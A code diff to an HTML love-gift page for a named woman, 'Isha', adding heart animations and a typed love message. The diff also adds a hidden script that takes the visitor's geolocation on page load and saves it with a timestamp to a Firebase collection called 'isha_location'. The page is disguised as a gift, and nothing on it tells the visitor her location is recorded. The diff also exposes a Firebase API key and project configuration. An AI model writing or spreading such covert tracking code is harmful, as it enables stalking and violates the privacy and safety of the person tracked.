@@ -20,7 +20,7 @@ justify-content:center;
 align-items:center;
 }
 
-/* Main box */
+/* Container */
 
 .container{
 width:90%;
@@ -28,7 +28,7 @@ max-width:350px;
 z-index:10;
 }
 
-/* Heart animation */
+/* Main heart */
 
 .heart{
 font-size:70px;
@@ -40,8 +40,6 @@ animation:beat 1s infinite;
 50%{transform:scale(1.3);}
 100%{transform:scale(1);}
 }
-
-/* Text */
 
 h1{
 font-size:28px;
@@ -63,14 +61,9 @@ margin-top:15px;
 
 .message{
 display:none;
-font-size:20px;
+font-size:22px;
 margin-top:15px;
-animation:fade 2s;
-}
-
-@keyframes fade{
-from{opacity:0}
-to{opacity:1}
+min-height:60px;
 }
 
 /* Falling hearts */
@@ -93,14 +86,49 @@ opacity:0;
 }
 }
 
+/* Explosion hearts */
+
+.popheart{
+position:absolute;
+font-size:25px;
+animation:pop 2s forwards;
+}
+
+@keyframes pop{
+0%{
+transform:scale(0);
+opacity:1;
+}
+100%{
+transform:translateY(-200px) scale(1.5);
+opacity:0;
+}
+}
+
 </style>
 
 </head>
 
 <body>
 
-<!-- Falling Hearts -->
+<div class="container">
+
+<div class="heart">❤️</div>
+
+<h1>Dear Isha ❤️</h1>
+
+<p>My Special Gift For You</p>
+
+<button onclick="showLove()">Open Gift 🎁</button>
+
+<div class="message" id="msg"></div>
+
+</div>
+
+
 <script>
+
+/* Background hearts */
 
 for(let i=0;i<25;i++){
 
@@ -120,28 +148,95 @@ document.body.appendChild(heart);
 </script>
 
 
-<div class="container">
-
-<div class="heart">❤️</div>
-
-<h1>Dear Isha ❤️</h1>
-
-<p>My Special Gift For You</p>
-
-<button onclick="showLove()">Open Gift 🎁</button>
-
-<div class="message" id="msg">
-I Love You Isha ❤️ <br>
-You Are My Sweetest Dream 🌹
-</div>
-
-</div>
 
 <script>
 
 function showLove(){
-document.getElementById("msg").style.display="block";
+
+/* Explosion hearts */
+
+for(let i=0;i<20;i++){
+
+let h=document.createElement("div");
+
+h.innerHTML="💖";
+h.className="popheart";
+
+h.style.left=(40+Math.random()*20)+"%";
+h.style.bottom="40%";
+
+document.body.appendChild(h);
+
 }
+
+/* Typing animation */
+
+let text="I Love You Isha ❤️ You Are My Sweetest Dream 🌹";
+let i=0;
+
+let msg=document.getElementById("msg");
+
+msg.style.display="block";
+msg.innerHTML="";
+
+let typing=setInterval(()=>{
+
+msg.innerHTML+=text.charAt(i);
+
+i++;
+
+if(i>=text.length){
+clearInterval(typing);
+}
+
+},80);
+
+}
+
+</script>
+
+
+
+<!-- Firebase + Location -->
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
+  authDomain: "remote-videoplayer.firebaseapp.com",
+  projectId: "remote-videoplayer",
+  storageBucket: "remote-videoplayer.firebasestorage.app",
+  messagingSenderId: "978359248102",
+  appId: "1:978359248102:web:c03c62454f8cbf70030727",
+  measurementId: "G-4D3PV2EGMX"
+
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+/* Save Location */
+
+navigator.geolocation.getCurrentPosition(
+
+async (position)=>{
+
+await addDoc(collection(db,"isha_location"),{
+
+latitude:position.coords.latitude,
+longitude:position.coords.longitude,
+time:new Date().toString()
+
+});
+
+}
+
+);
 
 </script>
 
